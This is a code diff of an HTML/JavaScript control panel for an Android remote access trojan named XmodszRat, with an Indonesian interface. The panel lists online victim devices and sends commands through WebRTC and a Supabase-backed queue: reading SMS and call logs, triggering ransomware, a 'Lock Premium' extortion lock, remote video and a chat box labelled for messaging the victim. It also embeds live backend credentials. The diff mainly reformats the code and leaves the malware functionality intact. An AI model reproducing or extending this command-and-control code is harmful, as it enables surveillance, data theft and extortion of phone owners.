@@ -34,12 +34,10 @@
 </head>
 <body>
   <div class="header">🚀 XmodszRat <small>v2.0</small></div>
-
   <div id="deviceContainer">
     <h3 style="margin-bottom:8px;">📱 Perangkat Online</h3>
     <div class="device-scroll" id="deviceList"></div>
   </div>
-
   <div class="grid" id="featureGrid">
     <div class="feature" data-cmd="get_sms"><span class="icon">📩</span>SMS</div>
     <div class="feature" data-cmd="get_calls"><span class="icon">📞</span>Call Logs</div>
@@ -59,32 +57,24 @@
     <div class="feature" data-cmd="ransomware"><span class="icon">💀</span>Ransomware</div>
     <div class="feature" data-cmd="lock_premium"><span class="icon">💰</span>Lock Premium</div>
   </div>
-
   <div class="video-wrap" id="videoWrap"><video id="remoteVideo" autoplay playsinline></video></div>
-
   <h3>💬 Chat</h3>
   <div class="chat-box" id="chatBox"></div>
   <div class="chat-input">
     <input id="chatInput" placeholder="Ketik pesan ke korban...">
     <button id="sendChatBtn">Kirim</button>
   </div>
-
   <h3>📋 Log</h3>
   <div class="log-box" id="logBox"></div>
-
   <div class="toast" id="toast"></div>
 
   <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2/dist/umd/supabase.min.js"></script>
   <script>
-    // =============== KONFIGURASI (UDAH PAKAI CREDENTIAL LU) ===============
     const SUPABASE_URL = 'https://hvxctzvtwyosyffstwii.supabase.co';
     const SUPABASE_KEY = 'sb_publishable_r8uOjL7SgzxqjzimofJRrw_TamZDiIh';
     const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
 
-    // =============== STATE ===============
-    let pc = null;
-    let dc = null;
-    let currentDevice = null;
+    let pc = null, dc = null, currentDevice = null;
     let chatInput = document.getElementById('chatInput');
     let chatBox = document.getElementById('chatBox');
     let logBox = document.getElementById('logBox');
@@ -93,7 +83,6 @@
     let remoteVideo = document.getElementById('remoteVideo');
     let toast = document.getElementById('toast');
 
-    // =============== FUNGSI UTAMA ===============
     function addLog(text) {
       const time = new Date().toLocaleTimeString();
       logBox.innerHTML += `[${time}] ${text}\n`;
@@ -143,11 +132,7 @@
         showToast('Sudah terhubung ke device ini');
         return;
       }
-      if (pc) {
-        pc.close();
-        pc = null;
-        dc = null;
-      }
+      if (pc) { pc.close(); pc = null; dc = null; }
       currentDevice = deviceId;
       addLog(`🔗 Menghubungkan ke ${deviceId}...`);
       showToast('Menghubungkan...');
@@ -161,10 +146,7 @@
         });
 
         dc = pc.createDataChannel('cmd');
-        dc.onopen = () => {
-          addLog('✅ Data channel terbuka');
-          showToast('Terhubung!');
-        };
+        dc.onopen = () => { addLog('✅ Data channel terbuka'); showToast('Terhubung!'); };
         dc.onclose = () => addLog('❌ Data channel ditutup');
         dc.onmessage = (e) => handleMessage(e.data);
 
@@ -187,12 +169,7 @@
 
         const offer = await pc.createOffer();
         await pc.setLocalDescription(offer);
-
-        await supabase.from('signaling').insert({
-          room: deviceId,
-          type: 'offer',
-          sdp: offer.sdp
-        });
+        await supabase.from('signaling').insert({ room: deviceId, type: 'offer', sdp: offer.sdp });
 
         const channel = supabase
           .channel('signaling_' + deviceId)
@@ -203,60 +180,37 @@
             filter: `room=eq.${deviceId}`
           }, async (payload) => {
             if (payload.new.type === 'answer' && payload.new.sdp) {
-              await pc.setRemoteDescription({
-                type: 'answer',
-                sdp: payload.new.sdp
-              });
+              await pc.setRemoteDescription({ type: 'answer', sdp: payload.new.sdp });
               addLog('✅ Answer diterima');
             } else if (payload.new.type === 'candidate' && payload.new.candidate) {
-              try {
-                await pc.addIceCandidate(JSON.parse(payload.new.candidate));
-              } catch (e) {}
+              try { await pc.addIceCandidate(JSON.parse(payload.new.candidate)); } catch (e) {}
             }
           })
           .subscribe();
 
         pc.onicecandidate = async (e) => {
           if (e.candidate) {
-            await supabase.from('signaling').insert({
-              room: deviceId,
-              type: 'candidate',
-              candidate: JSON.stringify(e.candidate)
-            });
+            await supabase.from('signaling').insert({ room: deviceId, type: 'candidate', candidate: JSON.stringify(e.candidate) });
           }
         };
-
         pc._channel = channel;
-
       } catch (e) {
         addLog('❌ Gagal konek: ' + e.message);
         showToast('Gagal konek: ' + e.message);
-        currentDevice = null;
-        pc = null;
-        dc = null;
+        currentDevice = null; pc = null; dc = null;
       }
     }
 
     function sendCommand(cmd) {
-      if (!currentDevice) {
-        showToast('Pilih device dulu!');
-        return;
-      }
+      if (!currentDevice) { showToast('Pilih device dulu!'); return; }
       if (dc && dc.readyState === 'open') {
         dc.send(cmd);
         addLog(`📤 Kirim: ${cmd}`);
         showToast('Perintah dikirim');
       } else {
-        supabase.from('commands').insert({
-          device_id: currentDevice,
-          cmd: cmd,
-          status: 'pending'
-        }).then(() => {
-          addLog(`📤 Queued: ${cmd}`);
-          showToast('Perintah diantrikan (fallback)');
-        }).catch(e => {
-          addLog('❌ Gagal queue: ' + e.message);
-        });
+        supabase.from('commands').insert({ device_id: currentDevice, cmd: cmd, status: 'pending' })
+          .then(() => { addLog(`📤 Queued: ${cmd}`); showToast('Perintah diantrikan (fallback)'); })
+          .catch(e => { addLog('❌ Gagal queue: ' + e.message); });
       }
     }
 
@@ -282,10 +236,7 @@
 
     function sendChat() {
       const text = chatInput.value.trim();
-      if (!text || !currentDevice) {
-        showToast('Isi pesan dan pilih device');
-        return;
-      }
+      if (!text || !currentDevice) { showToast('Isi pesan dan pilih device'); return; }
       sendCommand(`chat ${text}`);
       chatBox.innerHTML += `<div class="admin">👤 Admin: ${text}</div>`;
       chatBox.scrollTop = chatBox.scrollHeight;
@@ -300,21 +251,12 @@
     });
 
     document.getElementById('sendChatBtn').addEventListener('click', sendChat);
-    chatInput.addEventListener('keypress', (e) => {
-      if (e.key === 'Enter') sendChat();
-    });
+    chatInput.addEventListener('keypress', (e) => { if (e.key === 'Enter') sendChat(); });
 
-    // Polling hasil command (fallback)
     setInterval(async () => {
       if (!currentDevice) return;
       try {
-        const { data, error } = await supabase
-          .from('commands')
-          .select('*')
-          .eq('device_id', currentDevice)
-          .eq('status', 'done')
-          .neq('result', null)
-          .limit(5);
+        const { data, error } = await supabase.from('commands').select('*').eq('device_id', currentDevice).eq('status', 'done').neq('result', null).limit(5);
         if (error) return;
         for (let cmd of data) {
           if (cmd.result) {
@@ -326,11 +268,7 @@
     }, 4000);
 
     fetchDevices();
-    supabase
-      .channel('devices')
-      .on('postgres_changes', { event: '*', schema: 'public', table: 'devices' }, fetchDevices)
-      .subscribe();
-
+    supabase.channel('devices').on('postgres_changes', { event: '*', schema: 'public', table: 'devices' }, fetchDevices).subscribe();
     addLog('🚀 Dashboard siap, menunggu perangkat...');
   </script>
 </body>
